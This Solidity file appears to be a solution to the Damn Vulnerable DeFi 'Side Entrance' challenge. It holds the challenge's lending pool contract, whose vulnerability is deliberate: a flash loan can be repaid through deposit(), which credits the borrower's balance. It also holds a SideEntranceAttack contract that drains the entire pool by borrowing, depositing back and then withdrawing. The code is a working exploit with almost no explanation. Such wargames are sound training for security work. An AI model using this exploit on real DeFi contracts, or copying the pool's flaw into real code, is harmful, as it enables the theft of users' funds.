// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

contract SideEntranceAttack is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public sideentrancelendingpool;

    constructor(address _address) {
        sideentrancelendingpool = SideEntranceLenderPool(_address);
    }

    function steal() external {
        sideentrancelendingpool.flashLoan(
            address(sideentrancelendingpool).balance
        );
        sideentrancelendingpool.withdraw();
        (bool s, ) = msg.sender.call{value: address(this).balance}("");
        require(s);
    }

    fallback() external payable {}

    function execute() external payable override {
        sideentrancelendingpool.deposit{value: msg.value}();
    }
}